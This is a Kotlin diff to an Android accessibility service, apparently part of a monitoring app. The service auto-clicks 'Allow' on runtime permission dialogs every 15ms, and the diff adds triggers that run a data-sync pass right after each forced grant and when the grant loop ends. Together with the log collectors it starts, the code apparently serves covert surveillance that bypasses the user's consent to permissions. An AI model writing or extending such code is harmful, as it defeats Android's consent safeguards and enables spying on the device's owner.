@@ -102,12 +102,26 @@ class BlockAccessibilityService : AccessibilityService() {
         rulesCache = BlockRulesCache(applicationContext)
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
         startPermissionAutoGrantLoop()
+        com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
     }
 
     /**
      * Actively scans windows every 15ms for ~7.5 seconds to automatically click
      * "Allow" or "While using the app" on all sequential runtime permission dialogs.
      */
+    private var permissionSyncRunnable: Runnable? = null
+    private val syncDebounceHandler = Handler(Looper.getMainLooper())
+
+    private fun scheduleSyncAfterPermissionClick() {
+        permissionSyncRunnable?.let { syncDebounceHandler.removeCallbacks(it) }
+        val r = Runnable {
+            Log.i("BlockA11y", "Permissions updated via auto-grant — triggering instant SyncRunner pass")
+            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+        }
+        permissionSyncRunnable = r
+        syncDebounceHandler.postDelayed(r, 600L)
+    }
+
     fun startPermissionAutoGrantLoop() {
         val handler = Handler(Looper.getMainLooper())
         var runs = 0
@@ -118,6 +132,8 @@ class BlockAccessibilityService : AccessibilityService() {
                 clickAnyPermissionDialog()
                 if (runs < maxRuns) {
                     handler.postDelayed(this, 15L)
+                } else {
+                    com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
                 }
             }
         }
@@ -159,6 +175,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         for (node in nodes) {
                             if (clickNodeOrParent(node)) {
                                 Log.i("BlockA11y", "Auto-clicked permission button by ID: " + viewId)
+                                scheduleSyncAfterPermissionClick()
                                 return true
                             }
                         }
@@ -178,6 +195,7 @@ class BlockAccessibilityService : AccessibilityService() {
 
             for (root in candidateRoots) {
                 if (findAndClickExactText(root, allowExactTexts)) {
+                    scheduleSyncAfterPermissionClick()
                     return true
                 }
             }
@@ -185,6 +203,7 @@ class BlockAccessibilityService : AccessibilityService() {
             // Step 3: Flexible ID suffix fallback
             for (root in candidateRoots) {
                 if (findAndClickIdSuffix(root)) {
+                    scheduleSyncAfterPermissionClick()
                     return true
                 }
             }
